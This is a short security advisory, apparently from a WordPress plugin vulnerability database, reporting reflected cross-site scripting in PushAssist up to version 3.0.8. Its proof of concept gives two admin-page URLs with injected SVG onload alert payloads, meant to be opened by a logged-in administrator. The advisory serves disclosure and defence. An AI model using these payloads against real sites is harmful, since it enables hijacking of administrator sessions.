## WordPress Plugin Vulnerabilities

# PushAssist <= 3.0.8 - Reflected Cross-Site Scripting

### Description

The plugin does not sanitise and escape various parameters before outputting them back in pages, leading to Reflected Cross-Site Scripting which could be used against high privilege users such as admin.

### Proof of Concept

Make a logged in admin open one of the URL below:
https://example.com/wp-admin/admin.php?page=pushassist-create-account&response\_message=<svg/onload=alert(/XSS/)>
https://example.com/wp-admin/admin.php?page=pushassist-send-notifications&response\_message=aaa&class="><svg/onload=alert(/XSS/)> (requires the plugin to be connected to a PushAssist account)
Other URLs are affected, the above are just two of them
